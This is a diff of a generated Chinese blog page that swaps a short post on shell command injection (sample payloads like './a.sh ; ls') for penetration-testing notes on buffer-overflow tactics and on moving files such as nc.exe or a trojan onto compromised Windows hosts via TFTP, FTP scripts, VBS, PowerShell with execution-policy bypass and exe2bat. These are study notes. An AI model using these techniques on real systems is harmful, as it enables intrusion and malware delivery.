@@ -206,7 +206,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/21/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/24/%E6%BA%A2%E5%87%BA%E6%80%9D%E8%B7%AF/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/Image.JPG">
@@ -220,7 +220,7 @@
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
           
-            <a href="/2020/04/21/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" class="post-title-link" itemprop="url">缓冲区溢出</a>
+            <a href="/2020/04/24/%E6%BA%A2%E5%87%BA%E6%80%9D%E8%B7%AF/" class="post-title-link" itemprop="url">溢出思路</a>
         </h1>
 
         <div class="post-meta">
@@ -230,14 +230,14 @@
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              <time title="Created: 2020-04-21 17:52:50" itemprop="dateCreated datePublished" datetime="2020-04-21T17:52:50+08:00">2020-04-21</time>
+              <time title="Created: 2020-04-24 12:21:43" itemprop="dateCreated datePublished" datetime="2020-04-24T12:21:43+08:00">2020-04-24</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-04-23 19:59:02" itemprop="dateModified" datetime="2020-04-23T19:59:02+08:00">2020-04-23</time>
+                <time title="Modified: 2020-04-26 10:01:43" itemprop="dateModified" datetime="2020-04-26T10:01:43+08:00">2020-04-26</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -262,10 +262,74 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>比较简单的漏洞样板：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">! /bin/bash</span></span><br><span class="line">echo $1</span><br></pre></td></tr></table></figure>
-<p>意思就是说打印传进来的第一个参数，例如：<code>./a.sh test</code><br>原本是这样的，但是和SQL注入一样，我们增加闭合来实现代码注入：<br><code>./a.sh ; ls</code><br><code>./a.sh | ls</code><br><code>./a.sh &amp;&amp; ls</code><br><code>./a.sh &amp; ls</code><br>最终输出的效果就是把我们的目录打印了出来。</p>
-<h1 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h1><p>用户提交大型数据，数据溢出到数据边界，占到别的内存了。<br>在下篇文章记录！</p>
+          <h2 id="溢出其余思路"><a href="#溢出其余思路" class="headerlink" title="溢出其余思路"></a>溢出其余思路</h2><ol>
+<li>有的时候我们可能只能发送指定个数的溢出字符，比如说只有发送3000个a的时候我们才能控制EIP的指定内容。</li>
+<li>有的时候我们可能并不能修改很多字符，情况是我们在EIP后面的栈内容中只能写很少个数的内容，但是我们溢出肯定有很多代码，所以找到那段字节，这个值可能是存在eax/ebx/edi之类的寄存器存储的内存单元指向的地址的，我们可以修改他，然后使用jmp eax之类的命令跳转过去，当然我们还是要先将EIP跳到ESP，然后间接跳转。</li>
+<li>跳转的时候还可以使用call，但是记得要恢复堆栈平衡的。</li>
+<li>溢出的坏字符一定要先查询</li>
+</ol>
+<h2 id="搜索漏洞"><a href="#搜索漏洞" class="headerlink" title="搜索漏洞"></a>搜索漏洞</h2><ol>
+<li>Exploit-db</li>
+<li>SecurityFocus</li>
+<li>Searchsploit</li>
+</ol>
+<h2 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h2><ol>
+<li><p>Linux：</p>
+<ol>
+<li>netcat</li>
+<li>curl</li>
+<li>wget</li>
+</ol>
+</li>
+<li><p>Windows：<br>nc反弹的shell并不是一个交互的shell，不能进一步使用太多功能。</p>
+<ol>
+<li>TFTP（UDP，不加密，没有身份验证）<ol>
+<li>XP，2003都是有的</li>
+<li>Win7、2008都需要单独添加</li>
+<li>但是一般会被防火墙过滤</li>
+<li>mkdir /tftp</li>
+<li>将要上传到文件复制到tftp中</li>
+<li>chown -R nobody /tftp</li>
+<li>atftpd –daemon –port 69 /tftp</li>
+<li>netstat -panu | grep 69</li>
+<li>上面的命令主要是判断是不是atftpd打开的69，如果不是说明chown需要再运行一次</li>
+<li>在shell中使用<code>tftp -i 192.168.209.130 get 在tftp中的文件</code></li>
+</ol>
+</li>
+<li>FTP进行下载<ol>
+<li><code>echo open 192.168.209.130 &gt; ftp.txt</code></li>
+<li><code>echo username &gt;&gt; ftp.txt</code></li>
+<li><code>echo password &gt;&gt; ftp.txt</code></li>
+<li><code>echo bin &gt;&gt; ftp.txt</code></li>
+<li><code>echo GET file.exe &gt;&gt; ftp.txt</code></li>
+<li><code>echo bye &gt;&gt; ftp.txt</code></li>
+<li>在shell中执行<code>ftp -s:ftp.txt</code></li>
+</ol>
+</li>
+<li>vbs通过http传输<ol>
+<li>使用echo输出</li>
+<li>然后本机开80，放木马</li>
+<li>对面下载（使用cscript）</li>
+</ol>
+</li>
+<li>使用POWERSHELL传输文件<ol>
+<li>编写脚本和vbs差不多</li>
+<li><code>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonIneractive -NoProfile filename.ps1</code></li>
+</ol>
+</li>
+<li>使用Debug<ol>
+<li>使用压缩壳对木马进行压缩</li>
+<li>使用<code>exe2bat.exe nc.exe nc.txt</code>吧exe转换成文本的二进制文件</li>
+<li>然后在shell中执行echo的语句，记住最后两句不是</li>
+<li>他会在目标生成一个hex文件</li>
+<li>最后再使用他最后两句的第一句，使用Debug汇编会生成一个DLL</li>
+<li>然后使用最后一句改名DLL为执行程序</li>
+<li>这个方法不能大于64KB</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
 
       
     </div>
@@ -285,7 +349,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/9/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span><a class="page-number" href="/page/11/">11</a><span class="space">&hellip;</span><a class="page-number" href="/page/116/">116</a><a class="extend next" rel="next" href="/page/11/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <a class="extend prev" rel="prev" href="/page/9/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span><a class="page-number" href="/page/11/">11</a><span class="space">&hellip;</span><a class="page-number" href="/page/118/">118</a><a class="extend next" rel="next" href="/page/11/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -352,18 +416,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">116</span>
+          <span class="site-state-item-count">118</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
